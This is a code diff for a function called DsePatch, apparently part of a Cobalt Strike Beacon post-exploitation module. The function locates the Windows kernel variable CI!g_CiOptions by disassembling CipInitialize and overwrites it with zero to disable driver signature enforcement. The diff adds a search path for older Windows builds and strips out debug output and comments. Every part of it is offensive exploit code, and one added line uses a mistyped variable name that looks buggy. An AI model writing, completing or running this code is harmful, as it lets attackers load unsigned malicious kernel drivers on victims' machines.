@@ -145,7 +145,8 @@ D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 
 					RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
 
-					if ( Ver.dwBuildNumber > 16299 ) {
+					if ( Ver.dwBuildNumber > 16299 ) 
+					{
 						do
 						{
 							hde64_disasm( &Ptr[ Off ], &Hde );
@@ -174,16 +175,26 @@ D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 							Off = Off + Hde.len;
 						} while ( Off < 256 );
 					} else {
-						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "sorry, havent ported a g_CiOptions search prior to RS3 yet." ) ) );
-						goto Leave;
+						do
+						{
+							hde64_disasm( &Ptr[ Off ], &Hde );
+
+							if ( Hde.flags & F_ERROR ) {
+								break;
+							};
+							if ( Hde.len == 5 ) {
+								if ( Ptr[ Off ] == 0xE9 ) {
+									Rel = *( ULONG * )( Ptr + Off + 1 );
+									break;
+								};
+							};
+							off = Off + Hde.len;
+						} while ( Off < 256 );
 					};
 
 					Ptr = C_PTR( U_PTR( Ptr ) + Off + 5 + Rel );
 					Rel = 0;
 					Off = 0;
-
-					BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "CI!CipInitialize @ %p\n" ) ),
-							U_PTR( Inf->Module[ Idx ].ImageBase ) + U_PTR( Ptr ) - U_PTR( Map ) );
 
 					do
 					{
@@ -204,29 +215,17 @@ D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 
 					Ptr = C_PTR( U_PTR( Ptr ) + Off + 6 + Rel );
 					Adr = C_PTR( U_PTR( Inf->Module[ Idx ].ImageBase ) + U_PTR( Ptr ) - U_PTR( Map ) );
-					Adr = C_PTR( U_PTR( Adr ) - 0x100000000 ); // fucked up some math here.
+					Adr = C_PTR( U_PTR( Adr ) - 0x100000000 );
 
 					if ( ! Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Adr, &Opt, sizeof( Opt ), NULL ) ) 
 					{
-						BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "CI!g_CiOptions = 0x%x\n" ) ), Opt );
-
-						/*
-						 * Windows 11 does _NOT_ like this. For some reason, they
-						 * changed it in Win11 to protect the bloody section from
-						 * R/W.
-						 *
-						 * :(.
-						 *
-						 * Gotta find another place to overwrite.
-						**/
-
 						if ( ! Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Adr, &( DWORD ){ 0x0 }, sizeof( DWORD ), NULL ) ) 
 						{
 							BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "dsepatch disabled driver signing enforcement." ) ), 0x0 );
 						} else {
 							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not disable driver signing enforcement." ) ) );
 							goto Leave;
-						}; */
+						};
 					} else {
 						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read g_CiOptions. exploit failed." ) ) );
 						goto Leave;
